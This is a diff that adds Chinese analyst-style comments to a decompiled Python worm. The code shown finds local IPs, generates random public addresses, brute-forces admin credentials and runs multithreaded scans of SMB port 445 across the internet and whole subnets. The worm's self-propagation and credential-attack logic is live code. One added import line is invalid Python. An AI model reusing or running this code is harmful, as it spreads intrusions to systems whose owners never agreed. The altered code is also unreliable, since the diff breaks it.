@@ -1,4 +1,5 @@
 # Embedded file name: ii.py
+from __future__ import division, print_function, xrange
 import subprocess
 import re
 import binascii
@@ -115,6 +116,7 @@ ntlist = []
 
 mkatz = "abc"
 
+# 获取本地IP和外网IP
 def find_ip():
     global iplist2
     ipconfig_process = subprocess.Popen('ipconfig /all', stdout=subprocess.PIPE)
@@ -147,7 +149,7 @@ def find_ip():
     iplist2.sort(key=iplist.index)
     return iplist2
 
-
+# 生成随机IP？
 def xip(numb):
     del nip[:]
     for n in xrange(numb):
@@ -188,13 +190,13 @@ def scan3(ip, p):
     except Exception as e:
         return 0
 
-
+# 漏洞验证
 def validate(ip, fr):
-    global userlist2
-    global dl
-    global ee2
-    global domainlist
-    global passlist
+    global userlist2 # admin administrator
+    global dl # 空
+    global ee2 # 空
+    global domainlist # 空列表
+    global passlist # 密码
     for u in userlist2:
         for p in passlist:
             if u == '' and p != '':
@@ -237,8 +239,9 @@ def scansmb(ip, p):
 
     semaphore1.release()
 
-
+# 扫描smb 445端口
 def scansmb2(ip, p):
+    # 1为端口开放
     if scan2(ip, 445) == 1:
         print('exp IP:' + ip)
         try:
@@ -1560,7 +1563,7 @@ def mmka():
     except:
         print('except')
 
-
+# 入口
 mmka()
 var = 1
 while var == 1:
@@ -1622,6 +1625,7 @@ while var == 1:
         print('smb over  sleep 200s')
         time.sleep(5)
         print('eb2 internet')
+        # 向公网随机地址发smb扫描
         for s in xip(500):
             if s.split('.')[0].strip() == '127':
                 continue
@@ -1640,12 +1644,14 @@ while var == 1:
             cidr = int(cidr)
             host_bits = 32 - cidr
             i = struct.unpack('>I', socket.inet_aton(ip))[0]
+            # 该段起始地址
             start = i >> host_bits << host_bits
+            # 该段结束地址
             end = i | (1 << host_bits) - 1
             for i in range(start + 1, end):
                 semaphore1.acquire()
                 ip = socket.inet_ntoa(struct.pack('>I', i))
-                t1 = threading.Thread(target=scansmb2, args=(ip, 445))
+                t1 = threading.Thread(target=scansmb2, args=(ip, 445)) # 扫描smb 的445端口
                 t1.start()
 
             time.sleep(2)
